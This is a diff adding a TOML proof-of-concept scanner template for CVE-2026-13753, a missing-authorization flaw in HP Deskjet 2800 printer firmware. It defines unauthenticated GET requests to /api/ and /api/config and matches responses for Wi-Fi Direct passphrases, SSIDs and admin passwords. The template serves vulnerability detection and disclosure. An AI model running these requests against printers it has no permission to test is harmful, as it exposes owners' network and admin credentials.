@@ -1,0 +1,65 @@
+[info]
+author = "ave"
+description = "HP Deskjet 2800 系列打印机固件 <=TBP1CN2612AR 的嵌入式 Web 服务器 API 层存在授权缺失漏洞（CWE-862）。未经验证的远程攻击者可通过 GET 请求访问多个管理 API 端点，获取明文 Wi-Fi Direct 凭据、SNMP 配置、设备序列号等敏感数据。"
+id = "POC-AVE-2026-0057"
+name = "HP Deskjet 2800 系列打印机未授权访问漏洞 PoC"
+severity = "high"
+tags = [
+    "cve-2026-13753",
+    "hp-deskjet",
+    "missing-auth",
+    "information-disclosure",
+]
+vuln_id = [
+    "CVE-2026-13753",
+    "AVE-2026-0057",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "wifiDirect",
+    "ssid",
+    "passphrase",
+    "WiFiDirect",
+    "deviceId",
+    "serialNumber",
+    "adminPassword",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/config"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "wifiDirect",
+    "ssid",
+    "passphrase",
+    "WiFiDirect",
+    "deviceId",
+    "serialNumber",
+    "adminPassword",
+]
